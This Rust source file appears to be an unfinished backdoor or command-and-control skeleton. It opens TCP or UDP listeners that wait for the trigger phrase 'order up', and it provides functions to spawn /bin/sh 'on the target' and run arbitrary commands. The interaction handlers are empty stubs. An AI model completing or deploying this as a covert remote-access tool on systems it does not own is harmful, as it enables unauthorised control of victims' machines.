use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};


//pub struct info {
//  arch: String,
//  os: String,
//  hostname: String,
//}

pub struct Listener {
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr){
    match protocol {
        "udp" => listen_udp(lsn, address),
        "tcp" => listen_tcp(lsn, address),
        "http" => listen_tcp(lsn, address),
        "dns" => listen_udp(lsn, address),
        &_ => todo!(),
    }
}

// listens using a TcpListener
fn listen_tcp(lsn: &mut Listener, address: SocketAddr){
    lsn.status = 1;
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening tcp listener on port {}", address.port());
    loop {
        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 2048];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2;
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream);
                    lsn.status = 1;
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0;
}

// listens using a UdpSocket
fn listen_udp(lsn: &mut Listener, address: SocketAddr){
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).unwrap());
    println!("[+] Opening udp listener on port {}", address.port());
    loop { // break loop if connection is made
        let mut buffer = [0; 2048];
        let (bytes, src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            // switches to interact mode
            interact_udp(lsn, src);
            lsn.status = 1;
        }
    }
    lsn.status = 0;
}

fn interact_udp(lsn: &mut Listener, target: SocketAddr) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}
